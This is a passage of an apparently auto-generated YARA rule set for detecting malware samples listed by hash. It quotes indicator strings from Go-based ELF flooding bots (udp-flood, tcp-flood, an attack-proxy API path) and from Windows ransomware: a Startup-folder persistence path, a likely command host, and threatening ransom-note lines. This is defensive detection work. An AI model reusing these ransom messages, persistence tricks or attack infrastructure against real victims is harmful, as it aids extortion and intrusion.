      $x2 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '36.50'*/
      $x3 = "invalid empty Content-Lengthnet/http: invalid trailer %shttp: no Host in request URLos: process already finishedos: process alre" ascii /* score: '36.00'*/
      $s4 = "x10803440x14402560x1600Apple GPUsame-siteX-Real-IPudp-floodtcp-floodminecraftForwardedCF-Worker%x/%d;o=1%s@%s.comSec-Ch-Ua\"Wind" ascii /* score: '21.50'*/
      $s5 = "reflect.MakeSlice: len > capmalformed MIME header line: /usr/local/share/mime/globs2invalid byte in chunk lengthinvalid proxy ad" ascii /* score: '21.00'*/
      $s6 = "elected unsupported curvetls: missing ServerKeyExchange messagetls: internal error: unsupported curveafter decimal point in nume" ascii /* score: '20.00'*/
      $s7 = "ound %c instead/proc/sys/net/ipv4/tcp_max_syn_backlog/proc/sys/net/ipv4/ip_local_port_rangetls: invalid ServerKeyExchange messag" ascii /* score: '18.00'*/
      $s8 = "routinesgcBgMarkWorker: mode not setmspan.sweep: m is not lockedfound pointer to free objectmheap.freeSpanLocked - span fatal: m" ascii /* score: '17.00'*/
      $s9 = "lled in invalid modefinal release of handle without processStatustransitioning GC to the same state as before?produced a trigger" ascii /* score: '15.00'*/
      $s10 = "g ALPNtls: received new session ticket from a clienthttp2: Transport creating client conn %p to %vprotocol error: received DATA " ascii /* score: '13.00'*/
      $s11 = "eexpected an Ed25519 public key, got %Tinternal error: unknown signature typetls: server selected unsupported grouptls: server s" ascii /* score: '13.00'*/
      $s12 = "wakeup - double wakeup (region exceeds uintptr range/gc/heap/frees-by-size:bytes/gc/heap/tiny/allocs:objects/sched/goroutines:go" ascii /* score: '12.00'*/
      $s13 = "ack (>65535)no free connections available to hostcannot parse response status code: %wbigmod: internal error: shrinking natcrypt" ascii /* score: '11.00'*/
      $s14 = "thod indexparsing/packing of this section has completedbufio.Scanner: Read returned impossible countdialling unsuccessful. Pleas" ascii /* score: '11.00'*/
      $s15 = "missing NULL parametersx509: invalid CRL distribution points%d chains with incompatible key usagegodebug: unexpected IncNonDefau" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_55 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
   strings:
      $x1 = "startTheWorld: inconsistent mp->nextpruntime: unexpected SPWRITE function all goroutines are asleep - deadlock!semaphore wake of" ascii /* score: '75.50'*/
      $s2 = "cked - invalid span stateattempted to add zero-sized address rangeruntime: blocked read on closing polldescstopTheWorld: not sto" ascii /* score: '25.00'*/
      $s3 = "dress family not supported by protocolerrors: target must be a non-nil pointer13877787807814456755295395851135253906256938893903" ascii /* score: '20.00'*/
      $s4 = " find trailing lfmissing required Host header in requesterror when reading response headers: %werror when reading response trail" ascii /* score: '20.00'*/
      $s5 = "ric literalflag %s set at %s before being definedfailed to parse Location header %q: %vsyscall: readInt with unsupported sizeind" ascii /* score: '19.50'*/
      $s6 = "otocol error: headers after END_STREAMinvalid span in heapArena for user arenabulkBarrierPreWrite: unaligned argumentsruntime: t" ascii /* score: '18.00'*/
      $s7 = "ablehttp2: Transport health check failure: %vhttp2: invalid Upgrade request header: %qtransport got GOAWAY with error code = %vn" ascii /* score: '15.00'*/
      $s8 = "CTimex509: invalid key usagex509: malformed version\", missing CPU support" fullword ascii /* score: '15.00'*/
      $s9 = "ted identifier, found EOF insteadattribute operator %q is not supportedcipher: incorrect tag size given to GCMcrypto/cipher: inc" ascii /* score: '15.00'*/
      $s10 = "and map writeerror when reading request trailer: %wcrypto/sha256: invalid hash state sizecrypto/sha512: invalid hash state sizei" ascii /* score: '13.00'*/
      $s11 = "ng done but phase is not GCoffobjects added out of order or overlappingmheap.freeSpanLocked - invalid stack freemheap.freeSpanLo" ascii /* score: '12.00'*/
      $s12 = " slicemalformed MIME header: missing colon: %qevictOldest(%v) on table with %v entrieserror when copying form file %q (%q): %wer" ascii /* score: '12.00'*/
      $s13 = "ite counttls: internal error: unsupported key (%T)invalid value length: expected %d, got %dhttp2: no cached connection was avail" ascii /* score: '11.50'*/
      $s14 = "tate after sweepruntime: blocked write on free polldescsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus faile" ascii /* score: '11.00'*/
      $s15 = "essagehttp2: timeout awaiting response headersFrame accessor called on non-owned Framehttp2: Transport encoding header %q = %qpr" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _7100aad9d24cb928369369e5b2141e5a_imphash__7100aad9d24cb928369369e5b2141e5a_imphash__46ef4064_7100aad9d24cb928369369e5b2141e_56 {
   meta:
      description = "_subset_batch - from files 7100aad9d24cb928369369e5b2141e5a(imphash).exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_46ef4064.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_5902f593.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_5ae5906d.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_5f46afe5.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_63e98db6.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_78ca2e2e.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_8d71f363.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_9b202a81.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_a989b50b.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_bb630e27.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_be77e6e0.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_cff8d0ab.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_d7fb75fe.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_dca0a9a5.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_e36e3134.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_ed3b9398.exe, 7100aad9d24cb928369369e5b2141e5a(imphash)_f80fdaef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fbdeb80c1b91a1cf673c355226fdacf11139b52d11515008f55d9dbfbbb028fb"
      hash2 = "46ef4064738bfaa95b0577a0554dd711e338cc9aee98ef01a9e111a5ecd3a9b9"
      hash3 = "5902f593fe71c32af772be4802110632de186747f5e0c6773f1cb80beb0bab99"
      hash4 = "5ae5906d95a05ee9e5b5795c243c38623b71730b14125df146c5566555f6bdd1"
      hash5 = "5f46afe56023976f37468d616895159bf5f191a15ac0376ed2449cf6c8e11a6e"
      hash6 = "63e98db6e9283b8a43754e182302b3013ff0e6e2eba7d998bf85068f9ecaff6e"
      hash7 = "78ca2e2e494981228e178348bca6a054e96cbf71c5136c314d9b8f87673c3e8d"
      hash8 = "8d71f36317e4e531013888c1f398e5c88d0d2ad7cd2bd215e6721f260fecfd58"
      hash9 = "9b202a81ecb2c2d6d575994874ec658e2cff83f966c1f6cbefb8559c85baf019"
      hash10 = "a989b50b986e2e7182c004a96153291a4b372d43f85b4dde7a8d527c0f88191e"
      hash11 = "bb630e276cb9ed8886b6f107d8373312a1e26c06033a4889c7dd16a94d552216"
      hash12 = "be77e6e0b376b7a4b1bd447361ea98ae50623ce379b3158b29576ff32b08b01a"
      hash13 = "cff8d0ab121cdb90f78edd233f9b27f7642f488135a27083094ea32570a9f23a"
      hash14 = "d7fb75fe26bc7c124448e0e1e62f450802f4cb5c93e71cde60cf3b4fc0e3c2e5"
      hash15 = "dca0a9a570527a3d62926f7d5e5284075ab9d170f132c629baf9dea04b9940bc"
      hash16 = "e36e3134cbb97f931fee09fce3aad48b6f6123ebcab71296c6961cdc81c17ffd"
      hash17 = "ed3b939853d00a66e95c86ccba11fa3daffe1172ef55f04d98a058fe064e907e"
      hash18 = "f80fdaef3613bf3883026ebe995955b1200afa413a87dcf677467b93c35d2a8a"
   strings:
      $x1 = "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" fullword ascii /* score: '38.00'*/
      $s2 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s3 = "xmb.pythonanywhere.com" fullword ascii /* score: '21.00'*/
      $s4 = "%USERPROFILE%\\Downloads" fullword ascii /* score: '20.00'*/
      $s5 = "C:\\Windows\\System32\\" fullword ascii /* score: '18.00'*/
      $s6 = "%USERPROFILE%\\Documents" fullword ascii /* score: '14.00'*/
      $s7 = "%s\\README.txt" fullword ascii /* score: '14.00'*/
      $s8 = "%USERPROFILE%\\Desktop" fullword ascii /* score: '14.00'*/
      $s9 = "%USERPROFILE%\\Videos" fullword ascii /* score: '14.00'*/
      $s10 = "%USERPROFILE%\\Music" fullword ascii /* score: '14.00'*/
      $s11 = ">>> If you report us AFTER restoration, we WILL attack you again!!! <<<" fullword ascii /* score: '12.00'*/
      $s12 = "Using AES-256-CBC encryption, your databases, documents, photos and other important files have been encrypted!" fullword ascii /* score: '12.00'*/
      $s13 = "By sensitive information we mean passwords, and similar!" fullword ascii /* score: '12.00'*/
      $s14 = "See for yourself! Look at any file with the .raz extension and its content!" fullword ascii /* score: '12.00'*/
      $s15 = "We will provide payment information, once payment is done, we will sent you a decryptor!" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 60KB and pe.imphash() == "7100aad9d24cb928369369e5b2141e5a" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_0512719a1f878b3611b03d100a854910_imphash__37d3842_57 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 0512719a1f878b3611b03d100a854910(imphash).exe, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "418ec7ea2b11e518fea98992db9c087d4a38df8b4e9c52b55045d7cd0abdd9ac"
      hash3 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash4 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash5 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash6 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
      hash7 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash8 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash9 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash10 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "targetpc" fullword ascii /* score: '18.00'*/
      $s2 = "reflect.makeComplex" fullword ascii /* score: '10.00'*/
      $s3 = "reflect.Value.runes" fullword ascii /* score: '10.00'*/
      $s4 = "reflect.Value.setRunes" fullword ascii /* score: '10.00'*/
      $s5 = "reflect.cvtComplex" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.FuncForPC" fullword ascii /* score: '10.00'*/
      $s7 = "reflect.(*rtype).Key" fullword ascii /* score: '10.00'*/
      $s8 = "reflect.cvtStringRunes" fullword ascii /* score: '10.00'*/
      $s9 = "reflect.makeRunes" fullword ascii /* score: '10.00'*/
      $s10 = "reflect.cvtRunesString" fullword ascii /* score: '10.00'*/
      $s11 = "waitsema" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b_33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11_58 {
   meta:
      description = "_subset_batch - from files 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash2 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash3 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash4 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash5 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
   strings:
      $s1 = "ffer.Grow: negative counttls: failed to write to key log: tls: invalid server finished hashtls: unexpected ServerKeyExchange1421" ascii /* score: '26.00'*/
      $s2 = "iod must be non-negativeruntime: name offset out of rangeruntime: type offset out of rangesync: RUnlock of unlocked RWMutexrefle" ascii /* score: '18.00'*/
      $s3 = "er field value for %qpad size larger than data payloadframe_pushpromise_promiseid_shortunsupported transfer encoding: %qbytes.Bu" ascii /* score: '16.00'*/
      $s4 = "id buffer overlappseudo header field after regularhttp: invalid Read on closed Bodynet/http: skip alternate protocolinvalid head" ascii /* score: '15.00'*/
      $s5 = "split at bad timepanic while printing panic valuesync: Unlock of unlocked RWMutexsync: negative WaitGroup counterMapIter.Value c" ascii /* score: '15.00'*/
      $s6 = "509: invalid RSA public exponentx509: SAN rfc822Name is malformedx509: invalid extended key usageswebsocket: bad write message t" ascii /* score: '15.00'*/
      $s7 = "N*struct { F uintptr; .autotmp_19 *http.Transport; .autotmp_20 *http.wantConn }" fullword ascii /* score: '13.00'*/
      $s8 = "use of UnreadBytebufio: tried to fill full buffered25519: bad public key length: crypto/aes: input not full blockcrypto/des: inp" ascii /* score: '13.00'*/
      $s9 = "ut not full block\" not supported for cpu option \"sha3: write to sponge after readuse of closed network connectionunexpected ch" ascii /* score: '13.00'*/
      $s10 = "N*struct { F uintptr; .autotmp_10 *http.Transport; .autotmp_11 *http.wantConn }" fullword ascii /* score: '13.00'*/
      $s11 = "crypto/ecdh.(*PrivateKey).PublicKey.func1" fullword ascii /* score: '13.00'*/
      $s12 = "L*struct { F uintptr; .autotmp_7 *http.Transport; .autotmp_8 *http.wantConn }" fullword ascii /* score: '13.00'*/
      $s13 = " not in a stack spanstackalloc not on scheduler stackruntime: goroutine stack exceeds runtime: text offset out of rangetimer per" ascii /* score: '12.00'*/
      $s14 = "fferent packages)end outside usable address spaceruntime: fixalloc size too largeinvalid limiter event type foundscanstack: goro" ascii /* score: '11.00'*/
      $s15 = "ate failed with runtime: castogscanstatus oldval=stoplockedm: inconsistent lockingfindrunnable: negative nmspinningfreeing stack" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11_59 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash3 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "http: no Host in request URLEd25519 verification failureMultiple padding extensions!18189894035458564758300781259094947017729282" ascii /* score: '33.00'*/
      $x2 = "<F><F><F><F>/usr/bin/dir/usr/bin/topinvalid atypcontent-typemax-forwardsout of range100-continuerecv_goaway_Multi-StatusNot Modi" ascii /* score: '32.00'*/
      $s3 = "racemadvdontneedharddecommitdumping heapchan receive span.limit= span.state=bad flushGen MB stacks, worker mode  nDataRoots= nSp" ascii /* score: '27.00'*/
      $s4 = "theworldtracebackancestorsadaptivestackstartgarbage collectionsync.RWMutex.RLockGC worker (active)stopping the worldsystem page " ascii /* score: '21.00'*/
      $s5 = "igcode= m->curg=(unknown)traceback} stack=[ lockedm=%s %q: %sempty url#execwait/dev/nullcomplex64invalid nfuncargs(bad indirrefl" ascii /* score: '16.50'*/
      $s6 = ", size = , tail = newosprocrecover:  not in [ctxt != 0, oldval=, newval= threads=: status= blocked= lockedg=atomicor8 runtime= s" ascii /* score: '16.50'*/
      $s7 = "e hangupSIGWINCH: window size changecomparing uncomparable type notewakeup - double wakeup (region exceeds uintptr range/gc/heap" ascii /* score: '15.00'*/
      $s8 = "runtime.headTailIndex.tail" fullword ascii /* score: '15.00'*/
      $s9 = "pdate binderscannot send after transport endpoint shutdowncontext: internal error: missing cancel errortransitioning GC to the s" ascii /* score: '14.00'*/
      $s10 = "09: error fetching intermediate: %wrepeated read on failed websocket connectioncipher: NewGCM requires 128-bit block ciphercrypt" ascii /* score: '13.00'*/
      $s11 = "ckedfound pointer to free objectmheap.freeSpanLocked - span fatal: morestack on gsignal" fullword ascii /* score: '12.00'*/
      $s12 = " gp=runtime: getg:  g=forEachP: not done in async preempt" fullword ascii /* score: '12.00'*/
      $s13 = "C:/Program Files/Go/src/runtime/hash32.go" fullword ascii /* score: '10.00'*/
      $s14 = "ttp: putIdleConn: connection is in bad statehttp: no Client.Transport or DefaultTransportinvalid request :path %q from URL.Opaqu" ascii /* score: '10.00'*/
      $s15 = "/frees-by-size:bytes/gc/heap/tiny/allocs:objects/sched/goroutines:goroutinesgcBgMarkWorker: mode not setmspan.sweep: m is not lo" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_60 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash4 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash5 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash6 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = "x509: cannot verify signature: algorithm unimplementedx509: invalid RDNSequence: invalid attribute value: %sURI with IP (%q) can" ascii /* score: '59.50'*/
      $x2 = " 0frame_continuation_zero_streamhttp2: decoded hpack field %+vaccess-control-request-headerspersistConn was already in LRUassign" ascii /* score: '32.00'*/
      $s3 = " %q in %s; dropping invalid byteshttp2: Transport received GOAWAY from server ErrCode:%vmheap.freeSpanLocked - invalid free of u" ascii /* score: '28.50'*/
      $s4 = ": %vhttp2: client connection force closed via ClientConn.CloseGODEBUG=execwait=2 detected a leaked exec.Cmd created by:" fullword ascii /* score: '26.00'*/
      $s5 = "ic literalstream error: stream ID %d; %vframe_settings_ack_with_lengthillegal window increment valueHEADERS frame with stream ID" ascii /* score: '20.50'*/
      $s6 = "ling alarm clock (types from different scopes)failed to get system page sizeruntime: found in object at *( in prepareForSweep; s" ascii /* score: '20.00'*/
      $s7 = "Request messagetls: server selected an invalid PSK and cipher suite pairhttp2: TLS conn unexpectedly found in unencrypted handof" ascii /* score: '17.00'*/
      $s8 = " not supported before TLS 1.2received record with version %x when expecting version %xtls: server sent an unnecessary HelloRetry" ascii /* score: '15.00'*/
      $s9 = "weepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait/total:seconds" ascii /* score: '15.00'*/
      $s10 = "ected between runtime: impossible type kind unsafe.Slice: len out of rangecountry_code=%s,region_code=%sstrings: negative Repeat" ascii /* score: '12.50'*/
      $s11 = "net/http.Protocols.UnencryptedHTTP2" fullword ascii /* score: '12.00'*/
      $s12 = " ptrSeen via defersstrings: illegal use of non-zero Builder copied by valuehttp2: request body larger than specified content len" ascii /* score: '12.00'*/
      $s13 = "e. Response %qcipher.NewCBCEncrypter: IV length must equal block sizecipher.NewCBCDecrypter: IV length must equal block sizetls:" ascii /* score: '11.00'*/
      $s14 = "nsport.DialContext hook returned (nil, nil)range function continued iteration after loop body panicrange function continued iter" ascii /* score: '10.00'*/
      $s15 = "d SetBytesWithClamping input lengthcrypto/cipher: internal error: generic CBC used with AESptrEncoder.encode should have emptied" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11_61 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash3 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash4 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash5 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash6 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash7 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $s1 = "runtime.mapassign_fast32ptr" fullword ascii /* score: '13.00'*/
      $s2 = "sync/atomic.CompareAndSwapUint64" fullword ascii /* score: '11.00'*/
      $s3 = "runtime.mix32" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.uint64div" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.panicExtendIndex" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.panicExtendIndexU" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.goPanicExtendSliceBU" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.goPanicExtendSliceAlenU" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.goPanicExtendSliceB" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.uint64mod" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.makeslice64" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.goPanicExtendIndexU" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.panicExtendSliceAlenU" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.goPanicExtendIndex" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.panicExtendSliceBU" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e1_62 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash3 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash4 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "bytes.Buffer.Grow: negative counttls: failed to write to key log: tls: invalid server finished hashtls: unexpected ServerKeyExch" ascii /* score: '26.00'*/
      $s2 = "angeinvalid value %q for flag -%s: %vgo package net: confVal.netCgo = pseudo header field after regularhttp: invalid Read on clo" ascii /* score: '24.50'*/
      $s3 = "nexpected end of line in stringexpected ']', found '%c' instead,!\"#$%&'()*+ -./:;<=>?@[\\]^`{|}~http2write100ContinueHeadersFra" ascii /* score: '23.00'*/
      $s4 = "untime: stack split at bad timepanic while printing panic value%s/api/v1/attacks/shadow/proxiessync: Unlock of unlocked RWMutexs" ascii /* score: '15.00'*/
      $s5 = "cavenger state is already wiredsweep increased allocation countremovespecial on invalid pointergetWeakHandle on invalid pointerr" ascii /* score: '13.00'*/
      $s6 = "nexpected character, want colonuse of closed network connectionmime: invalid boundary charactermime: expected token after slashb" ascii /* score: '13.00'*/
      $s7 = "cdsa: internal error: r is zeroecdsa: internal error: s is zeroed25519: bad public key length: crypto/rsa: public key missing N/" ascii /* score: '13.00'*/
      $s8 = "nd outside usable address spaceruntime: fixalloc size too largeinvalid limiter event type foundscanstack: goroutine not stoppeds" ascii /* score: '11.00'*/
      $s9 = "internal/sync.(*HashTrieMap[go.shape.struct { net/netip.isV6 bool; net/netip.zoneV6 string },go.shape.struct { weak._ [0]*go.sha" ascii /* score: '10.00'*/
